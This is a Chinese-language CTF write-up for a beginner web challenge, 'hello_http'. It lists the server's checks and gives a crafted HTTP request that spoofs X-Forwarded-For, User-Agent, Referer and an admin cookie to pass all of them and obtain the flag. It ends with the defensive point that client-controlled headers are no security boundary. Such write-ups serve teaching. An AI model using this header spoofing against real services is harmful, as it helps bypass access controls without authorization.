# hello_http

## 题目简述

服务端依次校验请求方法、查询参数、表单字段、Cookie 和若干 HTTP 请求头。源码中的所有条件都来自客户端可控的请求字段，目标是把它们组合进同一个请求，而不是伪造真实的本机来源或浏览器环境。

## 解题过程

根据 `check()` 的判断，需要同时满足：

- 使用 `POST` 方法；
- 查询字符串为 `query=ctf`；
- 表单字段为 `action=getflag`；
- Cookie 为 `role=admin`；
- `X-Forwarded-For` 为 `127.0.0.1` 或 `localhost`；
- `User-Agent` 包含 `HarmonyOS Browser`；
- `Referer` 包含 `ys.mihoyo.com`。

构造最小请求如下，`Host` 替换为实际题目地址：

```http
POST /?query=ctf HTTP/1.1
Host: target
User-Agent: HarmonyOS Browser
Cookie: role=admin
X-Forwarded-For: 127.0.0.1
Referer: https://ys.mihoyo.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

action=getflag
```

发送后即可通过全部分支并获得 flag。这里的 `X-Forwarded-For` 只是普通请求头；若服务端无可信代理校验，客户端可以自行填写，不能据此可靠判断请求是否来自本机。

## 方法总结

这道题考查 HTTP 请求各组成部分的定位与构造：方法和 URL 参数属于请求行，Cookie 与 User-Agent 等属于请求头，`action` 属于表单请求体。审计类似逻辑时，应逐项列出约束并合并为一个最小请求，同时警惕把客户端可控请求头当作安全边界。
